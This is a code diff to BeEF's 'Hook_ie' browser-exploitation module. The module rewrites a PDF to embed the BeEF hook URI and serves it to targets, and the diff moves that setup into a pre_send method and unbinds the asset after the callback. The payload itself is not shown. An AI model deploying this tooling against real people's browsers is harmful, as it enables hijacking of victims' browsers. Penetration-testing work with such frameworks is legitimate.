@@ -27,7 +27,17 @@ class Hook_ie < BeEF::Core::Command
       'File' => __FILE__
     })
 		
-		#Get the servers configurations.
+		set_target({
+        'verified_status' =>  VERIFIED_WORKING, 
+        'browser_name' =>     ALL
+    })
+    
+    use 'beef.dom'
+    use_template!
+  end
+  
+  def pre_send
+    #Get the servers configurations.
     configuration = BeEF::Core::Configuration.instance
 		
 		#The hook url to be replace the token in the original pdf file.
@@ -38,6 +48,8 @@ class Hook_ie < BeEF::Core::Command
 		
 		# The original pdf file contains a token that will get replaced during the initialization with
 		# the actual hook URI of beef. Note that the hook URI is accessed via the DNS name.
+		
+		#xntrik - unsure what happens to this file after it's been re-written, <hookURI> will never be found again because it's been re-written?
 		File.open('./modules/browser/hook_ie/bounce_to_ie.pdf',"r") { |original_hook_file|
 			original_hook_file.each_line { |line|				
 				# If the line includes the hook token, then replace it with the actual hook URI
@@ -55,18 +67,14 @@ class Hook_ie < BeEF::Core::Command
 		#Bind the configured PDF file to the web server.
 		BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/browser/hook_ie/bounce_to_ie_configured.pdf', '/report', 'pdf', -1); 
     
-		set_target({
-        'verified_status' =>  VERIFIED_WORKING, 
-        'browser_name' =>     ALL
-    })
-    
-    use 'beef.dom'
-    use_template!
   end
 
   def callback
     content = {}
-    content['result'] = @datastore['result']    
+    content['result'] = @datastore['result']   
+    
+    #Unmount the assetnow that we've received the callback
+    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/report.pdf'); 
     
     save content
     #update_zombie!
